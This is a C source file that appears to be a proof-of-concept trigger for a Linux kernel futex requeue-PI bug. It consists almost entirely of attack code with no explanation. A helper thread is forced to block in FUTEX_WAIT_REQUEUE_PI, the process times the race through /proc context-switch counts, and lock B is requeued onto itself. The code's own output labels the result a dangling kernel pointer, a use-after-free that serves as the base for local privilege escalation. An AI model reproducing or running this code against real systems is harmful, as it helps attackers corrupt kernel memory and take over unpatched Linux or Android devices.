#include <stdio.h>
#include <unistd.h>
#include <pthread.h>
#include <stdlib.h>
#include <linux/futex.h>
#include <sys/syscall.h>
#include <sys/socket.h>

#define USERLOCK_FREE 0
#define USERLOCK_OCCUPIED 1
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI 12

inline void userlock_wait(volatile const int *userlock) {
    while (USERLOCK_OCCUPIED == *userlock) {
        usleep(10);
    }
}

inline void userlock_lock(volatile int *userlock) {
    *userlock = USERLOCK_OCCUPIED; 
}

inline void userlock_release(volatile int *userlock) {
    *userlock = USERLOCK_FREE;
}

int get_voluntary_ctxt_switches(pid_t tid) {
    FILE *fp;
    char proc_path[256];
    char buf[0x1000];
    char *ptr = buf;
    int count = -1;
    snprintf(proc_path, sizeof(proc_path), "/proc/self/task/%d/status", tid);
    fp = fopen(proc_path, "rb");
    if (fp != NULL) {
        fread(buf, sizeof(unsigned char), sizeof(buf), fp);
        ptr = strstr(buf, "voluntary_ctxt_switches:");
        ptr += strlen("voluntary_ctxt_switches:");
        count = atoi(ptr);
        fclose(fp);
    }
    return count;
}

void wait_for_thread_to_wait_in_kernel(pthread_t tid, int context_switch_count) {
    while (get_voluntary_ctxt_switches(tid) <= context_switch_count) {
        usleep(10);
    }
}

inline int futex_lock_pi(int *uaddr) {
    return syscall(__NR_futex, uaddr, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
}

inline int futex_wait_requeue_pi(int *uaddr1, int *uaddr2) {
    return syscall(__NR_futex, uaddr1, FUTEX_WAIT_REQUEUE_PI, 0, NULL, uaddr2, 0);
}

inline int futex_requeue_pi(int *uaddr1, int *uaddr2, int cmpval) {
    return syscall(__NR_futex, uaddr1, FUTEX_CMP_REQUEUE_PI, 1, NULL, uaddr2, cmpval);
}

int A = 0, B = 0;
volatile int invoke_futex_wait_requeue_pi = 0;
volatile pid_t thread_tid = -1;

//the dangling pointer thread
void *thread(void *arg) {
    thread_tid = gettid();
    printf("thread2: wait requeue pi\n");
    userlock_wait(&invoke_futex_wait_requeue_pi);
    futex_wait_requeue_pi(&A, &B);
    printf("thread2: someone woke me up\n");
    printf("thread2: dangling pointer at this point\n");
    while (1) {
        sleep(1);
    }
}

int main(int argc, char *argv[]) {
    pthread_t t;
    int context_switch_count = 0;
    printf("thread1: taking lock B\n");
    futex_lock_pi(&B);
    userlock_lock(&invoke_futex_wait_requeue_pi);
    pthread_create(&t, NULL, thread, NULL);
    /* Wait for the thread to be in a system call */
    while (thread_tid < 0) {
        usleep(10);
    }
    context_switch_count = get_voluntary_ctxt_switches(thread_tid);
    userlock_release(&invoke_futex_wait_requeue_pi);
    wait_for_thread_to_wait_in_kernel(thread_tid, context_switch_count);
    printf("thread1: requeue pi\n");
    futex_requeue_pi(&A, &B, A);
    printf("open lock B\n");
    B = 0;
    printf("thread1: requeue pi again\n");
    futex_requeue_pi(&B, &B, B);
    while (1) {
        sleep(1);
    }
    return 0;
}
